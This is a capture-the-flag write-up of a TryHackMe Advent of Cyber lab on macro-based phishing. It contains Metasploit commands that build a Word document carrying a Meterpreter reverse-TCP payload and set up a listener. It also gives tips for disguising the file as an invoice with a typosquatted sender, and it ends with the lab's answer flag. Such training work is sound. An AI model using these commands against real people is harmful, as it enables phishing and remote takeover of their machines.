# TryHackMe Advent of Cyber - Day 10: He had a brain full of macros, and had shells in his soul

Mayor Malware attempted to phish one of the SOC-mas organizers by sending a malicious macro-embedded document. The goal was to gain remote access to the organizer’s system upon opening the document. Marta May Ware’s system was compromised despite tight security, but McSkidy’s quick incident response mitigated significant damage. To prevent future incidents, a phishing exercise was conducted to assess Marta’s cybersecurity awareness.

### Objectives:
1. Understand how phishing attacks work.
2. Learn how macros in documents can be abused.
3. Carry out a phishing attack using a malicious macro.

---

## Phishing Attacks
Phishing exploits human vulnerabilities, making it one of the easiest and most effective social engineering techniques. Attackers use deceptive emails or messages to convince targets to take actions, such as opening malicious files or clicking harmful links, often by creating a false sense of urgency. These actions can lead to malware installation or information theft.

### Key Techniques:
- **Baiting**: Sending malicious files disguised as legitimate documents.
- **Urgency**: Encouraging immediate action to bypass critical thinking.
- **Typosquatting**: Using domain names resembling legitimate ones to trick targets.

---

## Macros and Their Role in Phishing
Macros automate repetitive tasks in MS Office applications but can be abused to execute malicious code. In phishing scenarios, attackers embed macros within documents to deliver payloads upon opening the file.

### How Macros Are Exploited:
1. **AutoOpen()**: Executes the macro automatically when the document is opened.
2. **Base64Decode()**: Decodes the payload hidden in the document properties.
3. **ExecuteForWindows()**: Runs the decoded payload, establishing a connection to the attacker’s system.

---

## Attack Plan
1. **Create a malicious document**:
   - Use the Metasploit Framework to embed a macro.
   - Payload: `windows/meterpreter/reverse_tcp`.
   - Store the document as `msf.docm`.
2. **Set up the attacker’s system**:
   - Start a listener using Metasploit’s `multi/handler`.
   - Match IP (`LHOST`) and port (`LPORT`) settings with the document configuration.
3. **Phish the target**:
   - Use typosquatting to send a convincing email from `info@socnas.thm`.
   - Rename the malicious document (e.g., `invoice.docm`).
4. **Exploit**:
   - Await the target’s interaction with the document.
   - Gain reverse shell access to the system.

---

## Tools and Commands

### Creating the Malicious Document:
```bash
msfconsole
set payload windows/meterpreter/reverse_tcp
use exploit/multi/fileformat/office_word_macro
set LHOST <attacker_ip>
set LPORT 8888
show options
exploit
```
Output: Macro-enabled document `msf.docm`.

### Setting Up the Listener:
```bash
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT 8888
show options
exploit
```

---

## Exploitation
When the target opens the document:
1. A reverse TCP connection is established between the target’s system and the attacker’s system.
2. The attacker gains control over the target’s machine.

---

## Key Takeaways
- Phishing remains a potent threat due to human vulnerability.
- Macros, while useful, pose significant risks if abused.
- Incident response and awareness training are critical to mitigating such attacks.


## Questions

1. What is the flag value inside the flag.txt file that’s located on the Administrator’s desktop?
    >THM{PHISHING_CHRISTMAS}
